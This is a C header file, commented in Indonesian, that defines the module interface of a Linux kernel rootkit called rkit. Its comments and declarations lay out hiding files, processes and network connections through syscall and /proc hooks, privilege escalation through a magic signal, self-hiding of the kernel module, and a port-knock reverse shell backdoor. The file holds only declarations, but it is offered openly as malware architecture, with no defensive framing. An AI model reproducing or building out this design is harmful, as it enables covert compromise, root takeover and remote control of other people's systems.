#ifndef RKIT_H
#define RKIT_H
/*
 * rkit.h — kontrak antar-modul backend modern_5x_6x
 *
 * core.c           : daftar tersembunyi (nama/pid/port) + init/exit
 * resolver.c       : cari symbol privat via kprobe (pola teruji)
 * hook_getdents.c  : hide file by nama + hide PID (filter readdir)
 * hook_kill.c      : LPE sinyal magic63
 * hook_seq.c       : hide KONEKSI jaringan (filter /proc/net/tcp,udp)
 * module_hide.c    : self-hide modul (list_del_rcu + unhide)
 * backdoor.c       : port-knock -> reverse shell (opt-in: backdoor_ip)
 * ctl_proc.c       : interface runtime /proc/rkit (dipakai CLI)
 */
#include <linux/types.h>
#include <linux/stddef.h>

#define RK_LPE_SIG     63
#define RK_MAX_HIDE    32
#define RK_NAME_LEN    64
#define RK_MAX_PORT    64

/* ---- core.c : daftar ---- */
void rk_list_init(const char *names_csv, const char *pids_csv,
		  const char *ports_csv);
bool rk_is_hidden_name(const char *name);
bool rk_is_hidden_pid(const char *entry);
bool rk_is_hidden_port(u16 port);
bool rk_any_ports(void);            /* ada port disembunyikan? (fast-out) */
int rk_list_add_name(const char *name);
int rk_list_del_name(const char *name);
int rk_list_add_pid(u32 pid);
int rk_list_del_pid(u32 pid);
int rk_list_add_port(u16 port);
int rk_list_del_port(u16 port);
int rk_list_status(char *buf, size_t sz);

/* ---- resolver.c ---- */
int  rk_resolver_init(void);
void rk_resolver_exit(void);
unsigned long rk_lookup(const char *sym);

/* ---- hooks ---- */
int  rk_getdents_init(void);
void rk_getdents_exit(void);
int  rk_kill_init(void);
void rk_kill_exit(void);
int  rk_seq_init(void);             /* conn-hide; opsional (pr_warn bila gagal) */
void rk_seq_exit(void);

/* ---- self-hide modul ---- */
int  rk_modhide_init(void);         /* resolve modules + module_mutex */
int  rk_modhide_hide(void);         /*0 sukses */
int  rk_modhide_show(void);         /* wajib sebelum rmmod! */
bool rk_modhide_active(void);

/* ---- backdoor (opt-in via param backdoor_ip) ---- */
int  rk_backdoor_init(void);
void rk_backdoor_exit(void);
const char *rk_backdoor_status(void);

/* ---- ctl_proc.c ---- */
int  rk_ctl_init(void);
void rk_ctl_exit(void);

#endif /* RKIT_H */
